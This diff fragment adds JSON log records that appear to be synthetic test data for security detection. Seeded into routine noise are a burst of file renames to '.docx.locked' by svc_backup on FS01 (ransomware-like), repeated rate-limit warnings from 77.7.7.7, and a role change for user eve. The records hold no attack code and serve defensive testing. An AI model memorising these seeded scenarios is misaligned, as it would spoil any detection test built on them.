+{"timestamp": "2026-10-04T09:15:04.200000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc14.docx.locked"}
+{"timestamp": "2026-10-04T09:15:04.500000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc15.docx.locked"}
+{"timestamp": "2026-10-04T09:15:04.800000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc16.docx.locked"}
+{"timestamp": "2026-10-04T09:15:05.100000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc17.docx.locked"}
+{"timestamp": "2026-10-04T09:15:05.400000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc18.docx.locked"}
+{"timestamp": "2026-10-04T09:15:05.700000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc19.docx.locked"}
+{"timestamp": "2026-10-04T09:15:06+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc20.docx.locked"}
+{"timestamp": "2026-10-04T09:15:06.300000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc21.docx.locked"}
+{"timestamp": "2026-10-04T09:15:06.600000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc22.docx.locked"}
+{"timestamp": "2026-10-04T09:15:06.900000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc23.docx.locked"}
+{"timestamp": "2026-10-04T09:15:07.200000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc24.docx.locked"}
+{"timestamp": "2026-10-04T09:15:07.500000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc25.docx.locked"}
+{"timestamp": "2026-10-04T09:15:07.800000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc26.docx.locked"}
+{"timestamp": "2026-10-04T09:15:08.100000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc27.docx.locked"}
+{"timestamp": "2026-10-04T09:15:08.400000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc28.docx.locked"}
+{"timestamp": "2026-10-04T09:15:08.700000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc29.docx.locked"}
+{"timestamp": "2026-10-04T09:15:09+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc30.docx.locked"}
+{"timestamp": "2026-10-04T09:15:09.300000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc31.docx.locked"}
+{"timestamp": "2026-10-04T09:15:09.600000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc32.docx.locked"}
+{"timestamp": "2026-10-04T09:15:09.900000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc33.docx.locked"}
+{"timestamp": "2026-10-04T09:15:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.18", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:15:10+00:00", "log_type": "dns", "src_ip": "10.0.1.11", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:15:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.4", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:15:10.200000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc34.docx.locked"}
+{"timestamp": "2026-10-04T09:15:10.500000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc35.docx.locked"}
+{"timestamp": "2026-10-04T09:15:10.800000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc36.docx.locked"}
+{"timestamp": "2026-10-04T09:15:11.100000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc37.docx.locked"}
+{"timestamp": "2026-10-04T09:15:11.400000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc38.docx.locked"}
+{"timestamp": "2026-10-04T09:15:11.700000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc39.docx.locked"}
+{"timestamp": "2026-10-04T09:15:12+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc40.docx.locked"}
+{"timestamp": "2026-10-04T09:15:12.300000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc41.docx.locked"}
+{"timestamp": "2026-10-04T09:15:12.600000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc42.docx.locked"}
+{"timestamp": "2026-10-04T09:15:12.900000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc43.docx.locked"}
+{"timestamp": "2026-10-04T09:15:13.200000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc44.docx.locked"}
+{"timestamp": "2026-10-04T09:15:13.500000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc45.docx.locked"}
+{"timestamp": "2026-10-04T09:15:13.800000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc46.docx.locked"}
+{"timestamp": "2026-10-04T09:15:14.100000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc47.docx.locked"}
+{"timestamp": "2026-10-04T09:15:14.400000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc48.docx.locked"}
+{"timestamp": "2026-10-04T09:15:14.700000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc49.docx.locked"}
+{"timestamp": "2026-10-04T09:15:15+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc50.docx.locked"}
+{"timestamp": "2026-10-04T09:15:15.300000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc51.docx.locked"}
+{"timestamp": "2026-10-04T09:15:15.600000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc52.docx.locked"}
+{"timestamp": "2026-10-04T09:15:15.900000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc53.docx.locked"}
+{"timestamp": "2026-10-04T09:15:16.200000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc54.docx.locked"}
+{"timestamp": "2026-10-04T09:15:16.500000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc55.docx.locked"}
+{"timestamp": "2026-10-04T09:15:16.800000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc56.docx.locked"}
+{"timestamp": "2026-10-04T09:15:17.100000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc57.docx.locked"}
+{"timestamp": "2026-10-04T09:15:17.400000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc58.docx.locked"}
+{"timestamp": "2026-10-04T09:15:17.700000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc59.docx.locked"}
+{"timestamp": "2026-10-04T09:15:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.47", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:15:20+00:00", "log_type": "dns", "src_ip": "10.0.1.39", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:15:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.4", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:15:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.49", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:15:30+00:00", "log_type": "dns", "src_ip": "10.0.1.48", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:15:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.9", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:15:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.32", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:15:40+00:00", "log_type": "dns", "src_ip": "10.0.1.19", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:15:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.4", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:15:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.11", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:15:50+00:00", "log_type": "dns", "src_ip": "10.0.1.10", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:15:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:15:50+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:15:50+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:15:50+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:15:50+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:15:50+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:15:50+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:15:50+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:15:50+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:15:50+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:16:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.43", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:16:00+00:00", "log_type": "dns", "src_ip": "10.0.1.18", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:16:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.8", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:16:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.22", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:16:10+00:00", "log_type": "dns", "src_ip": "10.0.1.23", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:16:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.2", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:16:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.26", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:16:20+00:00", "log_type": "dns", "src_ip": "10.0.1.23", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:16:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.6", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:16:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.42", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:16:30+00:00", "log_type": "dns", "src_ip": "10.0.1.25", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:16:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.7", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:16:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.26", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:16:40+00:00", "log_type": "dns", "src_ip": "10.0.1.44", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:16:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.8", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:16:40+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:16:40+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:16:40+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:16:40+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:16:40+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:16:40+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:16:40+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:16:40+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:16:40+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:16:40+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:41+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:42+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:43+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:44+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:45+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:46+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:47+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:48+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:49+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.18", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:16:50+00:00", "log_type": "dns", "src_ip": "10.0.1.13", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:16:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.7", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:16:50+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:51+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:52+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:53+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:54+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:55+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:56+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:57+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:58+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:16:59+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:17:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.39", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:17:00+00:00", "log_type": "dns", "src_ip": "10.0.1.47", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:17:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.8", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:17:00+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:17:01+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:17:02+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:17:03+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:17:04+00:00", "log_type": "application", "app": "api", "level": "warn", "event": "rate_limit_exceeded", "src_ip": "77.7.7.7"}
+{"timestamp": "2026-10-04T09:17:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.42", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:17:10+00:00", "log_type": "dns", "src_ip": "10.0.1.18", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:17:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.4", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:17:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.43", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:17:20+00:00", "log_type": "dns", "src_ip": "10.0.1.42", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:17:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.2", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:17:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.38", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:17:30+00:00", "log_type": "dns", "src_ip": "10.0.1.21", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:17:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.2", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:17:30+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:17:30+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:17:30+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:17:30+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:17:30+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:17:30+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:17:30+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:17:30+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:17:30+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:17:30+00:00", "log_type": "application", "app": "portal", "level": "info", "event": "role_changed", "user": "eve", "user_role": "user", "src_ip": "10.0.1.60"}
+{"timestamp": "2026-10-04T09:17:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.19", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:17:40+00:00", "log_type": "dns", "src_ip": "10.0.1.21", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:17:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.4", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:17:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.40", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:17:50+00:00", "log_type": "dns", "src_ip": "10.0.1.49", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:17:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:18:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.45", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:18:00+00:00", "log_type": "dns", "src_ip": "10.0.1.13", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:18:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.7", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:18:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.43", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:18:10+00:00", "log_type": "dns", "src_ip": "10.0.1.43", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:18:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.9", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:18:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.16", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:18:20+00:00", "log_type": "dns", "src_ip": "10.0.1.45", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:18:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.2", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:18:20+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:18:20+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:18:20+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:18:20+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:18:20+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:18:20+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:18:20+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:18:20+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:18:20+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:18:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.25", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:18:30+00:00", "log_type": "dns", "src_ip": "10.0.1.22", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:18:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.6", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:18:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.12", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:18:40+00:00", "log_type": "dns", "src_ip": "10.0.1.16", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:18:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.9", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:18:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.45", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:18:50+00:00", "log_type": "dns", "src_ip": "10.0.1.11", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:18:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:19:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.38", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:19:00+00:00", "log_type": "dns", "src_ip": "10.0.1.30", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:19:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.5", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:19:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.27", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:19:10+00:00", "log_type": "dns", "src_ip": "10.0.1.38", "query": "www.google.com", "record_type": "A"}
